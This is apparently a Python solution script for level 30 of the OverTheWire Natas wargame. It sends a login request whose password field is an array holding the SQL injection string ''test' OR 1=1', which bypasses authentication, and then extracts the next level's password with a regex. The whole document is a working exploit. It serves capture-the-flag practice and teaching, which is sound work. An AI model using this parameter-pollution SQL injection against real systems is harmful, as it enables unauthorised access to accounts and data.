import config
import os, re, base64
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

data = { "username" : "natas31",  "password" : ["\'test\' OR 1=1", 4] }

response = post(url, auth=(user, password), data=data)

password = re.findall(r"natas31(\w{32})", response.content)[-1]

print(password)
